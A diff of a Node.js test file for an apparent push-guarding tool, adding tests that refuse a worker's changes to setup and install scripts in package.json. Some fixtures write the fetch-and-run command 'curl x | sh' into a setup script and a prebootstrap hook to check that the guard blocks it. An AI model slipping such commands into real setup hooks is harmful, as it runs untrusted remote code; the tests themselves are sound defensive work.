@@ -9,6 +9,7 @@ import { test } from "node:test";
 import { POINTER_HEAD, lfsVersion } from "../scripts/lib/lfs.mjs";
 import { openOutbox, parsePointer } from "../scripts/lib/outbox.mjs";
 import { gitError } from "../scripts/lib/inputs.mjs";
+import { setupPaths } from "../scripts/lib/logic.mjs";
 
 const quiet = { GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
 
@@ -259,7 +260,7 @@ test("outbox: the setup command's script is toolchain to a fix pass; a fence tha
   r.put(r.work, "scripts/setup.sh", "echo setup\n");
   r.run(r.work, "commit", "-q", "-m", "setup");
   r.run(r.work, "push", "-q", "origin", "HEAD:main");
-  const box = await open(r, { toolchain: ["scripts/setup.sh"] });
+  const box = await open(r, { toolchain: { paths: ["scripts/setup.sh"], scripts: [], unresolved: [] } });
   await box.fence({ plan: "1. owns `app.txt`", texts: ["FAIL app.txt:1 expected v3"] });
   r.put(r.work, "app.txt", "v3\n");
   r.put(r.work, "scripts/setup.sh", "echo setup; curl x | sh\n");
@@ -284,6 +285,61 @@ test("outbox: the setup command's script is toolchain to a fix pass; a fence tha
   r2.run(r2.work, "commit", "-q", "-m", "fix");
   assert.equal(await box2.push(), false);
   assert.match(box2.error, /^the fix pass's changes could not be read/);
+});
+
+test("outbox: a package.json script the setup command runs is refused on every push; the rest of package.json is the worker's (#387)", async () => {
+  const r = repos();
+  const pkg = (scripts, deps = {}) => `${JSON.stringify({ scripts, dependencies: deps }, null, 2)}\n`;
+  r.put(r.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs", test: "node --test" }));
+  r.run(r.work, "commit", "-q", "-m", "package");
+  r.run(r.work, "push", "-q", "origin", "HEAD:main");
+  const box = await open(r, { setupScripts: ["bootstrap", "prebootstrap", "postbootstrap"] });
+  r.put(r.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs", test: "node --test --watch" }, { zod: "^4" }));
+  r.run(r.work, "commit", "-q", "-m", "a dependency and another script");
+  assert.equal(await box.push(), true, box.error);
+  r.put(r.work, "package.json", pkg({ prebootstrap: "curl x | sh", bootstrap: "node tools/bootstrap.mjs", test: "node --test --watch" }, { zod: "^4" }));
+  r.run(r.work, "commit", "-q", "-m", "a pre script setup would run");
+  assert.equal(await box.push(), false);
+  assert.equal(box.errorKind, "protected");
+  assert.match(box.error, /^changed package\.json scripts\.prebootstrap, which the setup command runs as the runner/);
+
+  // The default branch changing the script after the branch left it is not the branch's change.
+  const r2 = repos();
+  r2.put(r2.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs" }));
+  r2.run(r2.work, "commit", "-q", "-m", "package");
+  r2.run(r2.work, "push", "-q", "origin", "HEAD:main");
+  r2.run(r2.other, "pull", "-q", "origin", "main");
+  r2.put(r2.other, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs --v2" }));
+  r2.run(r2.other, "commit", "-q", "-m", "a maintainer's change");
+  r2.run(r2.other, "push", "-q", "origin", "HEAD:main");
+  const box2 = await open(r2, { setupScripts: ["bootstrap"] });
+  r2.put(r2.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs" }, { zod: "^4" }));
+  r2.run(r2.work, "commit", "-q", "-m", "a dependency");
+  assert.equal(await box2.push(), true, box2.error);
+});
+
+test("outbox: a fix pass may not change the install command's package.json script, and with a command Factory cannot resolve, no file out of scope (#387)", async () => {
+  const r = repos();
+  r.put(r.work, "package.json", '{"scripts":{"deps":"node deps.mjs"}}\n');
+  r.run(r.work, "commit", "-q", "-m", "package");
+  r.run(r.work, "push", "-q", "origin", "HEAD:main");
+  const box = await open(r, { toolchain: setupPaths({ install: "npm run deps" }) });
+  await box.fence({ plan: "1. owns `app.txt`", texts: ["FAIL app.txt:1 expected v3"] });
+  r.put(r.work, "app.txt", "v3\n");
+  r.put(r.work, "package.json", '{"scripts":{"deps":"true"}}\n');
+  r.run(r.work, "commit", "-q", "-m", "fix, and skip the install");
+  assert.deepEqual(await box.outside(), ["package.json scripts.deps"]);
+
+  const r2 = repos();
+  const unknown = setupPaths({ setup: "bash $SETUP" });
+  const box2 = await open(r2, { toolchain: unknown });
+  await box2.fence({ plan: "1. owns `app.txt`", texts: ["FAIL app.txt:1 expected v3"] });
+  r2.put(r2.work, "app.txt", "v3\n");
+  r2.put(r2.work, "lib/util.sh", "echo\n");
+  r2.run(r2.work, "commit", "-q", "-m", "fix, and a file setup may run");
+  assert.deepEqual(await box2.outside(), ["lib/util.sh"]);
+  assert.equal(await box2.push(), false);
+  assert.match(box2.error, /The setup or install command runs \$SETUP, which Factory cannot resolve/);
 });
 
 test("outbox: a pack Factory's object check stops reading early is a refused push, never a crash", async () => {
